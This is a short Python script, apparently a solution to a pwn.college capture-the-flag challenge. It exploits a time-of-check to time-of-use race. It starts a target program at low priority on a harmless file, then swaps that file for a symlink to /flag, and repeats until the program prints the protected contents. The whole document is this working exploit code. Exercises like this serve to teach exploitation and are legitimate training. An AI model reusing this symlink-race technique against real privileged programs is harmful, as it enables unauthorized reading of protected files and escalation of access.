#!/bin/python

import os
import sys
import time
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

FILE = '/home/hacker/file'
argv = ['nice', '-n19', sys.argv[1], FILE]
while True:
    with open(FILE, "w+") as f: 
        f.write('SOMETHING')
    proc = process(argv)

    os.unlink(FILE)
    os.symlink('/flag', './file')

    try: 
        proc.recvuntil(b"pwn.college")
        print(proc.recvline())
        break
    except:
        pass
